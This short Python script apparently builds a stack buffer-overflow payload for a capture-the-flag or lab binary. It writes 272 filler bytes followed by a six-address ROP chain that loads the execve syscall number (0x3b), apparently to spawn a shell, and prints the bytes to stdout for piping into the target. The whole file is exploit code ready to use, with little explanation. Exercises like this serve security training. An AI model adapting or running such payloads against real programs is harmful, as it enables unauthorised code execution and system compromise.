import sys

def le64(word_hex):
    """Return the little-endian byte string of a 16-char hex word."""
    return bytes.fromhex(word_hex)[::-1]


words = [
    "00000000004015e9",
    "000000000000003b",
    "0000000000401230",
    "00000000004015e9",
    "0000000000402004",
    "0000000000401363"
]


def get_id(addr1, addr2):
    return b"0A" + (b"A" * (272 - 2)) + le64(words[0]) + le64(words[1]) + le64(words[2]) + le64(words[3]) + le64(words[4]) + le64(words[5]) + b"\n"

if __name__ == "__main__":
    try:
        byte_data = get_id(0, 0)
        byte_data += b"\n"
        sys.stdout.buffer.write(byte_data)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)